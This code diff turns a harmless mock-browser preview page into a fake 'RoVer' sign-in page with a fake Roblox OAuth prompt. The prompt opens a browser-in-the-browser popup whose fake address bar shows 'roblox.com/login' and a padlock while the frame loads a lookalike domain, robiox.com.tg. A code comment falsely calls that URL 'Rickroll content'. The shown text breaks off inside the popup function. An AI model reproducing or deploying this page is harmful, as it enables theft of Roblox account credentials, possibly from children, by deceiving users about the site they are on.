@@ -1,406 +1,406 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Mock Browser — Draggable + Resizable (Iframe Preview)</title>
-<style>
-  :root{
-    --titlebar-bg:#2b2d31;
-    --titlebar-fg:#d1d5db;
-    --toolbar-bg:#1f232a;
-    --omnibox-bg:#0f1217;
-    --omnibox-fg:#e5e7eb;
-    --omnibox-border:#374151;
-    --btn-hover:rgba(255,255,255,.08);
-    --control-fg:#cfd3da;          /* normal glyph color */
-    --close-hover:#e81123;         /* Chrome red hover */
-    --titlebar-height:32px;
-    --toolbar-height:40px;
+  <meta charset="UTF-8" />
+  <title>RoVer - Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
+    body{background:#1e1d1f;min-height:100vh;overflow-x:hidden;color:#fff}
 
-    --content-bg:#181a20;
-    --shadow:0 18px 50px rgba(0,0,0,.45);
-    --accent:#60a5fa;
-  }
-  *{ box-sizing:border-box; }
-  body{ margin:0; background:#111; color:#ddd; font:14px/1.4 system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; }
+    header{background:#e00078;height:56px;display:flex;align-items:center;padding:0 20px;position:relative;z-index:1001}
+    .menu-btn{font-size:26px;color:#fff;cursor:pointer;background:none;border:none;margin-right:14px}
+    .logo{font-size:20px;font-weight:600;color:#fff;display:flex;align-items:center}
 
-  .window{
-    position:fixed; top:64px; left:64px;
-    width:1000px; height:680px;
-    background:#15171c; border-radius:8px; overflow:hidden; box-shadow:var(--shadow);
-  }
-  .window.maximized{ top:0 !important; left:0 !important; width:100vw !important; height:100vh !important; border-radius:0; }
-  .window.minimized .content{ display:none; }
+    .overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;visibility:hidden;transition:.25s;z-index:900}
+    .overlay.active{opacity:1;visibility:visible}
 
-  .titlebar{
-    height:var(--titlebar-height);
-    display:grid; grid-template-columns:1fr auto; align-items:center;
-    background:var(--titlebar-bg); color:var(--titlebar-fg);
-    padding:0 8px; gap:8px; border-bottom:1px solid rgba(255,255,255,.06);
-    user-select:none; cursor:grab; touch-action:none;
-  }
-  .titlebar.dragging{ cursor:grabbing; }
-  .titlebar .left{ display:flex; align-items:center; gap:8px; min-width:0; }
-  .chrome-logo-img{ display:block; width:14px; height:14px; object-fit:contain; filter:drop-shadow(0 0 .25px rgba(0,0,0,.6)); }
-  .title{ font-size:13px; opacity:.9; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+    .side-menu{position:fixed;top:0;left:-260px;width:260px;height:100%;background:#e00078;color:#fff;padding:20px;transition:.3s;z-index:1002}
+    .side-menu.active{left:0}
+    .side-menu .close-btn{font-size:28px;cursor:pointer;margin-bottom:20px;display:block;background:none;border:none;color:#fff}
+    .side-menu ul{list-style:none}
+    .side-menu ul li{margin:14px 0;font-size:16px}
+    .side-menu ul li a{text-decoration:none;color:#fff;display:block;padding:6px 10px;border-radius:4px;transition:background .2s}
+    .side-menu ul li a.disabled{opacity:.6;pointer-events:none}
+    .side-menu ul li a.active{background:#fff;color:#000}
 
-  /* Window controls (Chrome-like) */
-  .window-controls{ display:grid; grid-auto-flow:column; grid-auto-columns:46px; height:100%; }
-  .btn{
-    appearance:none; border:0; background:transparent; color:var(--control-fg);
-    display:grid; place-items:center; height:100%; cursor:pointer;
-  }
-  .btn:hover{ background:var(--btn-hover); }
-  .btn:active{ filter:brightness(.95); }
-  .btn.close:hover{ background:var(--close-hover); color:#fff; } /* red hover like Chrome */
+    .login-box{margin:80px auto;background:#000;padding:40px 30px;border-radius:6px;text-align:center;max-width:420px;width:90%;color:#fff;position:relative;z-index:1;transition:opacity .4s,transform .4s}
+    .login-box.hide{opacity:0;transform:scale(.95)}
+    .login-box.show{opacity:1;transform:scale(1)}
+    .login-box h2{font-size:24px;margin-bottom:8px;font-weight:600}
+    .login-box p{font-size:14px;margin-bottom:24px}
+    .login-box button{background:#e00078;color:#fff;border:none;padding:12px 28px;border-radius:22px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
+    .login-box button:hover{background:#b80062}
 
-  .ico{ width:16px; height:16px; display:block; }
-  .ico line, .ico rect, .ico path{ stroke:currentColor; stroke-width:1.6; vector-effect:non-scaling-stroke; }
-  .ico.min line{ stroke-linecap:square; }   /* crisp bar */
-  .ico.max rect{ fill:none; }               /* square outline */
-  .ico.close-x path{ stroke-linecap:square; } /* crisp square-capped X */
+    .oauth-box{background:#111;border-radius:8px;padding:30px 25px;text-align:center}
+    .oauth-box .top{font-size:22px;font-weight:700;margin-bottom:15px;text-align:left}
+    .oauth-box p.subtitle{font-size:14px;color:#ccc;margin:10px 0 20px;text-align:left}
+    .oauth-box hr{border:none;border-top:1px solid #333;margin:20px 0}
+    .oauth-box p.app-name{margin-bottom:20px;font-weight:600}
+    .oauth-box button.continue{background:#fff;color:#000;border:none;padding:12px;border-radius:6px;font-size:15px;width:100%;margin-bottom:15px;cursor:pointer}
+    .oauth-box p.or{margin:10px 0;color:#888}
+    .oauth-box button.return{background:#111;color:#fff;border:1px solid #333;padding:12px;border-radius:6px;font-size:15px;width:100%;cursor:pointer}
 
-  .toolbar{
-    height:var(--toolbar-height);
-    display:flex; align-items:center; gap:8px;
-    background:var(--toolbar-bg); border-bottom:1px solid rgba(255,255,255,.06);
-    padding:0 8px; user-select:none; cursor:grab; touch-action:none;
-  }
-  .toolbar.dragging{ cursor:grabbing; }
+    .extra-space{height:400px}
+    footer{background:#18181a;padding:30px 20px;display:flex;justify-content:space-between;flex-wrap:wrap;color:#ccc;font-size:14px}
+    footer .left{font-size:13px}
+    footer .right{display:flex;flex-wrap:wrap;gap:20px}
+    footer a{color:#ccc;text-decoration:none}
+    footer a:hover{ text-decoration:underline }
+    .footer-logo{font-weight:700;font-size:18px;background:linear-gradient(to right,#ff4da6,#ff6600);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;display:inline-block}
 
-  .omnibox{
-    display:flex; align-items:center; gap:8px; flex:1; height:28px;
-    background:var(--omnibox-bg); color:var(--omnibox-fg);
-    border:1px solid var(--omnibox-border); border-radius:14px; padding:0 10px;
-    cursor:auto;
-  }
-  .omnibox .lock{ width:14px; height:14px; color:#10b981; flex:0 0 auto; }
-  .omnibox input{ flex:1; background:transparent; border:0; outline:0; color:inherit; font:inherit; }
-  .bookmark{ width:16px; height:16px; color:#c7cbd3; cursor:pointer; }
-  .bookmark.active{ color:#f59e0b; }
+    /* Popup overlay */
+    #popupOverlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;visibility:hidden;transition:.25s;z-index:1990}
+    #popupOverlay.active{opacity:1;visibility:visible}
 
-  .content{
-    height:calc(100% - var(--titlebar-height) - var(--toolbar-height));
-    background:var(--content-bg); position:relative;
-  }
+    /* Chrome-style window fit for 320x640 content + bars (32 + 40) */
+    .mock-window{
+      position:fixed;
+      width:320px;             /* content width = 320 */
+      height:712px;            /* 640 content + 32 titlebar + 40 toolbar */
+      left:calc(50% - 160px);
+      top:24px;                /* start with top bar visible */
+      background:#15171c;color:#d1d5db;border-radius:8px;
+      box-shadow:0 18px 50px rgba(0,0,0,.45);
+      overflow:hidden; opacity:0; visibility:hidden;
+      transition:.2s opacity, .2s transform; z-index:2000;
+    }
+    .mock-window.active{opacity:1;visibility:visible}
+    .mock-window:fullscreen{
+      left:0 !important; top:0 !important; width:100vw !important; height:100vh !important; border-radius:0;
+    }
 
-  .frame-wrap{ position:absolute; inset:0; }
-  .frame-wrap iframe{ position:absolute; inset:0; width:100%; height:100%; border:0; background:#0b0e13; display:block; }
-  .frame-overlay{
-    position:absolute; inset:0; display:none; align-items:center; justify-content:center; text-align:center;
-    padding:24px; background:linear-gradient(to bottom, rgba(0,0,0,.35), rgba(0,0,0,.55));
-  }
-  .frame-overlay.show{ display:flex; }
-  .frame-overlay .panel{
-    background:rgba(17,24,39,.85); border:1px solid rgba(255,255,255,.12); color:#d1d5db;
-    border-radius:12px; padding:16px 18px; max-width:min(720px, 92%); box-shadow:var(--shadow);
-  }
-  .panel h3{ margin:0 0 8px; font-size:16px; }
-  .panel p{ margin:0 0 12px; font-size:13px; opacity:.95; }
-  .panel .row{ display:flex; gap:12px; justify-content:center; flex-wrap:wrap; }
-  .btn-link, .btn-ghost{
-    display:inline-flex; align-items:center; gap:8px; padding:8px 12px; border-radius:8px; text-decoration:none; font-weight:600; font-size:13px;
-  }
-  .btn-link{ color:#0b1220; background:var(--accent); }
-  .btn-ghost{ color:#e5e7eb; border:1px solid rgba(255,255,255,.14); background:rgba(255,255,255,.06); }
-  .btn-link:hover{ filter:brightness(0.95); }
-  .btn-ghost:hover{ background:rgba(255,255,255,.1); }
+    .mw-titlebar{height:32px;display:grid;grid-template-columns:1fr auto;align-items:center;padding:0 8px;gap:8px;background:#2b2d31;border-bottom:1px solid rgba(255,255,255,.06);user-select:none;cursor:grab;touch-action:none}
+    .mw-left{display:flex;align-items:center;gap:8px;min-width:0}
+    .mw-logo{width:14px;height:14px}
+    .mw-title{font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.9}
+    .mw-controls{display:grid;grid-auto-flow:column;grid-auto-columns:46px;height:100%}
+    .mw-btn{appearance:none;border:0;background:transparent;color:#cfd3da;display:grid;place-items:center;cursor:pointer}
+    .mw-btn:hover{background:rgba(255,255,255,.08)}
+    .mw-btn.close:hover{background:#e81123;color:#fff}
+    .mw-ico{width:16px;height:16px;display:block}
+    .mw-ico line,.mw-ico rect,.mw-ico path{stroke:currentColor;stroke-width:1.6;vector-effect:non-scaling-stroke}
+    .mw-ico.min line{stroke-linecap:square}
+    .mw-ico.max rect{fill:none}
+    .mw-ico.close-x path{stroke-linecap:square}
 
-  /* Resize handles */
-  .resizer{ position:absolute; touch-action:none; z-index:20; }
-  .resizer.n  { cursor:ns-resize; top:calc(var(--titlebar-height) + var(--toolbar-height) - 4px); left:0; right:0; height:8px; }
-  .resizer.e  { cursor:ew-resize; right:-4px; top:0; bottom:0; width:8px; }
-  .resizer.s  { cursor:ns-resize; bottom:-4px; left:0; right:0; height:8px; }
-  .resizer.w  { cursor:ew-resize; left:-4px; top:0; bottom:0; width:8px; }
-  .resizer.ne { cursor:nesw-resize; right:-6px; top:calc(var(--titlebar-height) + var(--toolbar-height) - 6px); width:12px; height:12px; }
-  .resizer.nw { cursor:nwse-resize; left:-6px;  top:calc(var(--titlebar-height) + var(--toolbar-height) - 6px); width:12px; height:12px; }
-  .resizer.se { cursor:nwse-resize; right:-6px; bottom:-6px; width:12px; height:12px; }
-  .resizer.sw { cursor:nesw-resize; left:-6px;  bottom:-6px; width:12px; height:12px; }
-  .window.maximized .resizer{ display:none; }
-</style>
+    .mw-toolbar{height:40px;display:flex;align-items:center;gap:8px;padding:0 8px;background:#1f232a;border-bottom:1px solid rgba(255,255,255,.06);user-select:none}
+    .mw-omnibox{position:relative;display:flex;align-items:center;gap:8px;flex:1;height:28px;background:#0f1217;color:#e5e7eb;border:1px solid #374151;border-radius:14px;padding:0 10px}
+    .mw-omnibox .lock{width:14px;height:14px;color:#10b981}
+    .mw-omnibox input{flex:1;background:transparent;color:inherit;border:0;outline:0;font:inherit;cursor:default}
+    .mw-omnibox input[readonly]{opacity:.95}
+
+    /* Content exactly 320x640; stretches in :fullscreen */
+    .mw-content{
+      position:relative;
+      width:320px;
+      height:640px;
+      background:#181a20;
+      margin:0 auto;
+    }
+    .mock-window:fullscreen .mw-content{
+      width:100%;
+      height:calc(100% - 32px - 40px);
+    }
+
+    .mw-frame{
+      position:absolute; left:0; top:0;
+      width:100%; height:100%;
+      border:0; background:#0b0e13; display:block;
+    }
+  </style>
 </head>
 <body>
-  <div class="window" id="fakeWindow">
-    <div class="titlebar" id="titlebar">
-      <div class="left">
-        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Google Chrome" width="14" height="14" class="chrome-logo-img" decoding="async" />
-        <div class="title" id="title">Preview — Google Chrome</div>
+  <header>
+    <button class="menu-btn">☰</button>
+    <div class="logo">RoVer</div>
+  </header>
+
+  <div class="overlay" id="overlay"></div>
+
+  <div class="side-menu" id="sideMenu">
+    <button class="close-btn" onclick="toggleMenu()">✕</button>
+    <ul>
+      <li><a href="#">Help</a></li>
+      <li><a href="#">Team Members</a></li>
+      <li><a href="#" class="disabled">RoVer Plus</a></li>
+      <li><a href="#">Manage Servers</a></li>
+      <li><a href="#" class="active">Sign In</a></li>
+    </ul>
+  </div>
+
+  <main>
+    <div class="login-box show" id="loginBox">
+      <h2>Sign in to RoVer</h2>
+      <p>You must be 13 years of age or older to continue.</p>
+      <button onclick="showOAuth()">Log in with Roblox</button>
+    </div>
+    <div class="extra-space"></div>
+  </main>
+
+  <footer>
+    <div class="left">
+      <span class="footer-logo">Imaginary Menagerie</span><br>
+      © 2024 Imaginary Menagerie, LLC.<br>
+      attributions
+    </div>
+    <div class="right">
+      <div>
+        <a href="#">Team members</a><br>
+        <a href="#">Support Discord server ↗</a><br>
+        <a href="#">Add RoVer to your server</a><br>
+        <a href="#">Bot Developer API</a>
       </div>
-      <div class="window-controls">
-        <button class="btn" id="minBtn" title="Minimize" aria-label="Minimize">
-          <svg class="ico min" viewBox="0 0 16 16" aria-hidden="true"><line x1="3" y1="8.5" x2="13" y2="8.5"/></svg>
+      <div>
+        <a href="#">Terms of Service</a><br>
+        <a href="#">Privacy Policy</a><br>
+        <a href="#">Verify your Roblox account</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Popup overlay + Chrome-style mock window -->
+  <div id="popupOverlay" class="overlay"></div>
+
+  <div id="mockWin" class="mock-window" aria-hidden="true">
+    <div class="mw-titlebar" id="mwTitlebar">
+      <div class="mw-left">
+        <img class="mw-logo" src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome" />
+        <div class="mw-title" id="mwTitle">Preview — Google Chrome</div>
+      </div>
+      <div class="mw-controls">
+        <button class="mw-btn" title="Minimize" aria-label="Minimize">
+          <svg class="mw-ico min" viewBox="0 0 16 16"><line x1="3" y1="8.5" x2="13" y2="8.5"/></svg>
         </button>
-        <button class="btn" id="maxBtn" title="Maximize" aria-label="Maximize">
-          <svg class="ico max" viewBox="0 0 16 16" aria-hidden="true"><rect x="3.5" y="3.5" width="9" height="9"/></svg>
+        <button id="mwMax" class="mw-btn" title="Fullscreen" aria-label="Fullscreen">
+          <svg class="mw-ico max" viewBox="0 0 16 16"><rect x="3.5" y="3.5" width="9" height="9"/></svg>
         </button>
-        <!-- Chrome-like Close button (square-capped X, proper weight, red hover) -->
-        <button class="btn close" id="closeBtn" title="Close" aria-label="Close">
-          <svg class="ico close-x" viewBox="0 0 16 16" aria-hidden="true">
-            <path d="M3.8 3.8L12.2 12.2M12.2 3.8L3.8 12.2"/>
-          </svg>
+        <button id="mwClose" class="mw-btn close" title="Close" aria-label="Close">
+          <svg class="mw-ico close-x" viewBox="0 0 16 16"><path d="M3.8 3.8L12.2 12.2M12.2 3.8L3.8 12.2"/></svg>
         </button>
       </div>
     </div>
 
-    <div class="toolbar" id="toolbar">
-      <div class="omnibox">
+    <div class="mw-toolbar" id="mwToolbar">
+      <div class="mw-omnibox" id="mwOmni">
         <svg class="lock" viewBox="0 0 24 24" fill="none" aria-hidden="true">
           <path d="M7 10V8a5 5 0 0 1 10 0v2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
           <rect x="5" y="10" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.6"/>
         </svg>
-        <input id="urlInput" value="https://example.com" spellcheck="false" autocomplete="off" />
-        <svg class="bookmark" id="bookmarkBtn" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-          <path d="M6 4h12a1 1 0 0 1 1 1v15l-7-4-7 4V5a1 1 0 0 1 1-1z"/>
-        </svg>
+        <input id="mwUrl" readonly value="https://roblox.com/login" spellcheck="false" />
       </div>
     </div>
 
-    <div class="content">
-      <div class="frame-wrap">
-        <iframe id="appFrame" title="Preview frame" loading="lazy" referrerpolicy="no-referrer"
-                sandbox="allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-pointer-lock"></iframe>
-        <div class="frame-overlay" id="frameOverlay">
-          <div class="panel">
-            <h3>Can’t show this site inside the window</h3>
-            <p>The site may block embedding (X-Frame-Options/CSP). You can still open it in a new tab or load a built‑in example page here.</p>
-            <div class="row">
-              <a id="openLink" href="#" target="_blank" rel="noopener noreferrer" class="btn-link">Open in new tab</a>
-              <a id="showBuiltIn" href="#" class="btn-ghost">Load built‑in Example page</a>
-            </div>
-          </div>
-        </div>
-      </div>
+    <div class="mw-content">
+      <!-- Exactly 320×640 by default; fills screen when the window is fullscreen -->
+      <iframe id="mwFrame"
+              class="mw-frame"
+              title="Preview frame"
+              allow="fullscreen; accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen></iframe>
     </div>
-
-    <!-- Resize handles -->
-    <div class="resizer n"  data-dir="n"></div>
-    <div class="resizer e"  data-dir="e"></div>
-    <div class="resizer s"  data-dir="s"></div>
-    <div class="resizer w"  data-dir="w"></div>
-    <div class="resizer ne" data-dir="ne"></div>
-    <div class="resizer se" data-dir="se"></div>
-    <div class="resizer sw" data-dir="sw"></div>
-    <div class="resizer nw" data-dir="nw"></div>
   </div>
 
-<script>
-/* Remove/hide any nav buttons if present */
-(() => {
-  const css = document.createElement('style');
-  css.textContent = '.nav-btn,#backBtn,#fwdBtn,#refreshBtn{display:none!important}';
-  document.head.appendChild(css);
-  ['backBtn','fwdBtn','refreshBtn'].forEach(id => document.getElementById(id)?.remove());
-  document.querySelectorAll('.nav-btn').forEach(el => el.remove());
-})();
+  <script>
+    // Displayed URL (omnibox) vs actual iframe content
+    const DISPLAY_URL = 'https://roblox.com/login'; // shown in the omnibox
+    const FRAME_URL   = 'https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F418536882031%2Fprofile'; // Rickroll content
 
-/* Drag + Maximize + Resize */
-(() => {
-  const winEl = document.getElementById('fakeWindow');
-  const minBtn = document.getElementById('minBtn');
-  const maxBtn = document.getElementById('maxBtn');
-  const closeBtn= document.getElementById('closeBtn');
+    // Side menu
+    const menuBtn = document.querySelector('.menu-btn');
+    const sideMenu = document.getElementById('sideMenu');
+    const overlay = document.getElementById('overlay');
+    function toggleMenu(){ sideMenu.classList.toggle('active'); overlay.classList.toggle('active'); }
+    menuBtn.addEventListener('click', toggleMenu);
+    overlay.addEventListener('click', toggleMenu);
 
-  const clamp = (n, min, max) => Math.max(min, Math.min(n, max));
-  const KEEP_X = 80, KEEP_Y = 48;
-  const MIN_W = 700, MIN_H = 420;
-
-  function bounds(){
-    const w = winEl.offsetWidth, h = winEl.offsetHeight;
-    return {
-      minLeft: Math.min(KEEP_X - w, 0),
-      maxLeft: Math.max(window.innerWidth  - KEEP_X, 0),
-      minTop:  Math.min(KEEP_Y - h, 0),
-      maxTop:  Math.max(window.innerHeight - KEEP_Y, 0)
-    };
-  }
-  function ensureInBounds(){
-    const r = winEl.getBoundingClientRect();
-    const b = bounds();
-    winEl.style.left = clamp(r.left, b.minLeft, b.maxLeft) + 'px';
-    winEl.style.top  = clamp(r.top,  b.minTop,  b.maxTop ) + 'px';
-  }
-
-  const headerSel = '#titlebar, #toolbar';
-  const blockSel  = '.window-controls, input, textarea, button, a, #bookmarkBtn';
-  let dragging=false, offX=0, offY=0;
-
-  function headerHit(target){
-    const inHeader = target.closest(headerSel);
-    if (!inHeader) return false;
-    if (target.closest(blockSel)) return false;
-    return true;
-  }
-  function startDrag(x,y){
-    const r = winEl.getBoundingClientRect();
-    offX = x - r.left; offY = y - r.top;
-    dragging = true; document.body.style.userSelect='none';
-  }
-  function moveDrag(x,y){
-    if (!dragging || winEl.classList.contains('maximized')) return;
-    const b = bounds();
-    winEl.style.left = clamp(x - offX, b.minLeft, b.maxLeft) + 'px';
-    winEl.style.top  = clamp(y - offY, b.minTop,  b.maxTop ) + 'px';
-  }
-  function endDrag(){ if(!dragging) return; dragging=false; document.body.style.userSelect=''; }
-
-  // Mouse drag
-  document.addEventListener('mousedown', (e) => {
-    if (e.button !== 0) return;
-    if (!headerHit(e.target)) return;
-    startDrag(e.clientX, e.clientY);
-    e.preventDefault();
-  });
-  document.addEventListener('mousemove', (e) => moveDrag(e.clientX, e.clientY));
-  document.addEventListener('mouseup', endDrag);
-
-  // Touch drag
-  document.addEventListener('touchstart', (e) => {
-    const t = e.touches[0]; if (!t) return;
-    if (!headerHit(e.target)) return;
-    startDrag(t.clientX, t.clientY);
-  }, {passive:false});
-  document.addEventListener('touchmove', (e) => {
-    const t = e.touches[0]; if (!t) return;
-    moveDrag(t.clientX, t.clientY);
-  }, {passive:false});
-  document.addEventListener('touchend', endDrag);
-  document.addEventListener('touchcancel', endDrag);
-
-  // Resizing
-  let resizing=false, dir='', start=null, startX=0, startY=0;
-  document.querySelectorAll('.resizer').forEach(h => {
-    h.addEventListener('pointerdown', (e) => {
-      if (winEl.classList.contains('maximized')) return;
-      resizing=true; dir=h.dataset.dir;
-      const r = winEl.getBoundingClientRect();
-      start = { left:r.left, top:r.top, right:r.right, bottom:r.bottom, width:r.width, height:r.height };
-      startX=e.clientX; startY=e.clientY;
-      h.setPointerCapture?.(e.pointerId);
-      e.preventDefault();
-    });
-    h.addEventListener('pointermove', (e) => {
-      if (!resizing) return;
-      const dx=e.clientX-startX, dy=e.clientY-startY;
-      let left=start.left, top=start.top, width=start.width, height=start.height;
-
-      if (dir.includes('e')) width  = Math.max(MIN_W, start.width  + dx);
-      if (dir.includes('s')) height = Math.max(MIN_H, start.height + dy);
-      if (dir.includes('w')){
-        const newLeft = Math.min(start.right - MIN_W, start.left + dx);
-        width = start.right - newLeft; left = newLeft;
-      }
-      if (dir.includes('n')){
-        const newTop = Math.min(start.bottom - MIN_H, start.top + dy);
-        height = start.bottom - newTop; top = newTop;
-      }
-
-      winEl.style.left = left + 'px';
-      winEl.style.top = top + 'px';
-      winEl.style.width = width + 'px';
-      winEl.style.height = height + 'px';
-    });
-    function stopResize(e){ if(!resizing) return; resizing=false; try{h.releasePointerCapture(e.pointerId);}catch{} ensureInBounds(); }
-    h.addEventListener('pointerup', stopResize);
-    h.addEventListener('pointercancel', stopResize);
-  });
-
-  // Window buttons
-  function toggleMax(){
-    if (!winEl.classList.contains('maximized')){
-      const r = winEl.getBoundingClientRect();
-      winEl.dataset.prev = JSON.stringify({left:r.left, top:r.top, width:r.width, height:r.height});
-      winEl.classList.add('maximized');
-    } else {
-      winEl.classList.remove('maximized');
-      try {
-        const p = JSON.parse(winEl.dataset.prev||'{}');
-        if (p.width) { winEl.style.left=p.left+'px'; winEl.style.top=p.top+'px'; winEl.style.width=p.width+'px'; winEl.style.height=p.height+'px'; }
-      } catch {}
-      ensureInBounds();
+    // OAuth: show Continue
+    function showOAuth(){
+      const box = document.getElementById("loginBox");
+      box.classList.remove("show"); box.classList.add("hide");
+      setTimeout(() => {
+        box.innerHTML = `
+          <h2>Sign in to RoVer</h2>
+          <div class="oauth-box">
+            <div class="top">ROBLOX</div>
+            <p class="subtitle">Authorize with Roblox OAuth</p>
+            <hr>
+            <p class="app-name">RoVer</p>
+            <button class="continue" onclick="openLogin()">Continue</button>
+            <p class="or">or</p>
+            <button class="return" onclick="location.reload()">Return to RoVer</button>
+          </div>
+        `;
+        box.classList.remove("hide"); box.classList.add("show");
+      }, 400);
     }
-  }
-  document.getElementById('titlebar')?.addEventListener('dblclick', toggleMax);
-  maxBtn?.addEventListener('click', toggleMax);
-  minBtn?.addEventListener('click', () => winEl.classList.toggle('minimized'));
-  closeBtn?.addEventListener('click', () => winEl.remove());
 
-  // Center once
-  requestAnimationFrame(() => {
-    const r = winEl.getBoundingClientRect();
-    if (!winEl.style.left) winEl.style.left = Math.max(16, (window.innerWidth  - r.width)/2) + 'px';
-    if (!winEl.style.top)  winEl.style.top  = Math.max(16, (window.innerHeight - r.height)/3) + 'px';
-    ensureInBounds();
-  });
-  window.addEventListener('resize', ensureInBounds);
-})();
+    // Popup logic
+    const mockWin    = document.getElementById('mockWin');
+    const popOv      = document.getElementById('popupOverlay');
+    const mwClose    = document.getElementById('mwClose');
+    const mwMax      = document.getElementById('mwMax');
+    const mwFrame    = document.getElementById('mwFrame');
+    const mwUrl      = document.getElementById('mwUrl');
+    const mwTitle    = document.getElementById('mwTitle');
+    const mwTitlebar = document.getElementById('mwTitlebar');
+    const mwToolbar  = document.getElementById('mwToolbar');
 
-/* Iframe preview logic for example site + built-in fallback */
-(() => {
-  const urlInput = document.getElementById('urlInput');
-  const frame = document.getElementById('appFrame');
-  const overlay = document.getElementById('frameOverlay');
-  const openLink = document.getElementById('openLink');
-  const showBuiltIn = document.getElementById('showBuiltIn');
-  const titleEl = document.getElementById('title');
+    const TITLEBAR_H = 32;
+    const TOOLBAR_H  = 40;
+    const TOPBAR_H   = TITLEBAR_H + TOOLBAR_H; // 72px
+    const SIDE_ANCHOR = 40;  // keep at least 40px visible horizontally
+    const TOP_VISIBLE = 12;  // keep at least 12px of top bar visible
+    const BOTTOM_ANCHOR = 40;// keep at least 40px visible at bottom
 
-  function setTitle(u){
-    try { titleEl.textContent = (new URL(u)).host + ' — Google Chrome'; }
-    catch { titleEl.textContent = 'Preview — Google Chrome'; }
-  }
+    function toEmbed(u){
+      try{
+        const url = new URL(u.trim());
+        const host = url.hostname.replace(/^www\./,'').toLowerCase();
+        if (host === 'youtu.be'){
+          const id = url.pathname.slice(1);
+          if (id) return 'https://www.youtube-nocookie.com/embed/' + id;
+        }
+        if (host.endsWith('youtube.com') || host.endsWith('youtube-nocookie.com')){
+          if (url.pathname === '/watch'){
+            const id = url.searchParams.get('v');
+            if (id) return 'https://www.youtube-nocookie.com/embed/' + id;
+          }
+          const shorts = url.pathname.match(/^\/shorts\/([A-Za-z0-9_-]+)/);
+          if (shorts) return 'https://www.youtube-nocookie.com/embed/' + shorts[1];
+          const emb = url.pathname.match(/^\/embed\/([A-Za-z0-9_-]+)/);
+          if (emb) return 'https://www.youtube-nocookie.com/embed/' + emb[1];
+        }
+        return u;
+      } catch { return u; }
+    }
 
-  function loadBuiltIn(){
-    overlay.classList.remove('show');
-    titleEl.textContent = 'example.local — Google Chrome';
-    frame.removeAttribute('src');
-    frame.srcdoc = `
-      <!doctype html><html><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
-      <title>Example Page</title>
-      <style>
-        body{margin:0;font:16px system-ui,Segoe UI,Roboto,Arial,sans-serif;background:#0b1220;color:#e5e7eb;display:grid;place-items:center;height:100vh;}
-        .card{max-width:720px;margin:24px;padding:28px;border-radius:14px;background:#111827;border:1px solid rgba(255,255,255,.12);box-shadow:0 14px 40px rgba(0,0,0,.35);}
-        h1{margin:0 0 6px;font-size:28px} p{margin:.5rem 0 0;color:#cbd5e1} a{color:#60a5fa;text-decoration:none} a:hover{text-decoration:underline}
-        code{background:#0f172a;padding:.15rem .4rem;border-radius:6px}
-      </style></head><body>
-      <div class="card"><h1>Embedded Example Page</h1>
-      <p>This is a built‑in page rendered via <code>iframe.srcdoc</code> so it always works offline.</p>
-      <p>Change the URL above to something you control to preview it here.</p></div></body></html>`;
-  }
+    function setTitle(u){
+      try{ mwTitle.textContent = (new URL(u)).host + ' — Google Chrome'; }
+      catch{ mwTitle.textContent='Preview — Google Chrome'; }
+    }
 
-  function showBlocked(u){
-    frame.removeAttribute('src'); frame.removeAttribute('srcdoc');
-    overlay.classList.add('show');
-    openLink.href = u;
-  }
+    function clampPosition(L, T, w, h){
+      // Horizontal: keep 40px visible
+      const minL = SIDE_ANCHOR - w;
+      const maxL = window.innerWidth  - SIDE_ANCHOR;
 
-  function navigate(u){
-    const url = u.trim();
-    setTitle(url);
-    openLink.href = url;
-    overlay.classList.remove('show');
-    frame.removeAttribute('srcdoc');
+      // Vertical: keep at least 12px of the top bar visible, and 40px at bottom
+      const minT = TOP_VISIBLE - TOPBAR_H;
+      const maxT = window.innerHeight - BOTTOM_ANCHOR;
 
-    let done = false;
-    const t = setTimeout(() => { if (!done) showBlocked(url); }, 1200);
-    frame.onload = () => { done = true; clearTimeout(t); overlay.classList.remove('show'); };
-    frame.onerror = () => { clearTimeout(t); showBlocked(url); };
-    frame.src = url;
-  }
+      const Lc = Math.min(Math.max(L, Math.min(minL, maxL)), Math.max(minL, maxL));
+      const Tc = Math.min(Math.max(T, Math.min(minT, maxT)), Math.max(minT, maxT));
+      return { L: Lc, T: Tc };
+    }
 
-  // Start with example.com
-  navigate(urlInput.value);
+    function centerMock(){
+      const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+      let L = (window.innerWidth - w) / 2;
+      let T = 24; // ensure top bar is visible initially
+      const {L: cL, T: cT} = clampPosition(L, T, w, h);
+      mockWin.style.left = cL + 'px';
+      mockWin.style.top  = cT + 'px';
+    }
 
-  urlInput.addEventListener('keydown', e => {
-    if (e.key === 'Enter') navigate(urlInput.value);
-    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'l') { urlInput.select(); e.preventDefault(); }
-  });
-  document.addEventListener('keydown', e => {
-    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'l') { urlInput.focus(); urlInput.select(); e.preventDefault(); }
-  });
+    function openMock(){
+      // Show roblox.com/login in the bar, but load the Rickroll in the frame
+      mwUrl.value = DISPLAY_URL;
+      setTitle(DISPLAY_URL);
